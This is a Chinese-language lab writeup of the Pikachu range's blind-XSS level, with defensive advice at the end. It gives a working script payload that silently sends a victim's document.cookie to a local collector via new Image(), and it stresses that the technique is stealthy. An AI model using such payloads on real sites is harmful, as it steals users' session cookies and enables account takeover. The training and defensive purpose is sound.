---
title: Pikachu XSS - XSS盲打后台数据外带实战
date: 2026-11-03
categories: [Web安全, 靶场Writeup]
tags: [Pikachu, XSS, 盲打, 数据外带]
---

## 题目: Pikachu XSS - XSS后台 (盲打接收端)

## 题目描述
在Pikachu靶场的“XSS盲打”关卡中，前端的留言板无法直接看到执行结果。题目要求利用靶场内置的“管理工具-XSS后台”作为接收端，构造恶意的Payload，将触发者的Cookie等敏感信息外带并存储在后台。

## 解题思路
在真实的XSS盲打攻击中，攻击者无法直接看到受害者的浏览器。因此，需要提前搭建一个接收后台。本关利用了Pikachu自带的 `pkxss` 后台。攻击逻辑为：
1. 在前台留言板注入 `<script>` 脚本。
2. 脚本利用 `new Image()` 对象静默向后台发送带有受害者 `document.cookie` 的 GET 请求。
3. 模拟管理员登录并访问留言页面，触发脚本执行。
4. 攻击者回到XSS后台，查看被窃取并存储的 Cookie 记录。

## 解题步骤
**1. 初始化攻击者后台环境 (⚠️ 踩坑记录)**
* **操作**：访问左侧菜单的“管理工具” -> “XSS后台”。
* **踩坑记录**：初次访问时报错 `Warning: mysqli_connect(): (HY000/1049): Unknown database 'pkxss'`。这是因为靶场部署时未初始化该后台的数据库。
* **解决**：手动访问 `http://127.0.0.1/pikachu/pkxss/pkxss_install.php`，点击页面上的“安装/初始化”按钮，系统会自动建库建表。随后使用默认账号 `admin / 123456` 即可成功登录后台。

**2. 生成测试数据 (注入与触发 Payload)**
* **原理解释**：使用 `new Image()` 是为了创建一张图片，但请求的URL是后台的接收地址。这种方式不会改变页面视觉效果，非常隐蔽。
* **操作 1 (注入)**：去前台访问 XSS 盲打留言板，提交以下 Payload：
  `<script>new Image().src="http://127.0.0.1/pikachu/pkxss/xcookie/cookie.php?cookie="+document.cookie;</script>`
* **操作 2 (触发)**：以管理员身份登录 `admin_login.php`，随后访问 `admin.php` 查看留言。此时你的浏览器会静默执行 Payload，将当前页面的 Cookie 发送到后台。

**3. 在 XSS 后台查看战果 (⚠️ 踩坑记录)**
* **操作**：回到 XSS 后台 `xssmanager.php`，点击左侧的 `cookie搜集`。
* **踩坑记录**：初次回显时，页面刷新后没有记录（空白）。尝试关掉靶场和电脑去休息，重启后再次访问，记录才成功出现。这说明本地环境可能存在缓存或数据库延迟。
* **结果**：页面成功显示了多条记录，包含了 `time`（时间）、`ipaddress`（IP）、`cookie`（敏感凭证）、`referer`（来源）以及 `useragent` 等信息。证明盲打漏洞利用成功，数据外带链路完全打通。

## 知识点总结
1. **盲打数据外带**：XSS盲打的核心是“打点 -> 触发 -> 外带 -> 接收”。必须保证Payload在受害者（管理员）上下文中执行，并将数据请求发送到攻击者可控的服务器。
2. **无感外带技巧**：`new Image()` 是XSS外带数据最常用的技巧之一，它可以静默发起跨域请求，不会造成页面刷新或跳转，极难被察觉。
3. **防御策略**：
   * 对用户输入进行 HTML 实体编码（如 `htmlspecialchars`）。
   * 为敏感的 Cookie 设置 `HttpOnly` 属性，彻底阻止 JavaScript 读取。
   * 后台管理系统在渲染用户提交的数据时，同样必须进行上下文输出编码。
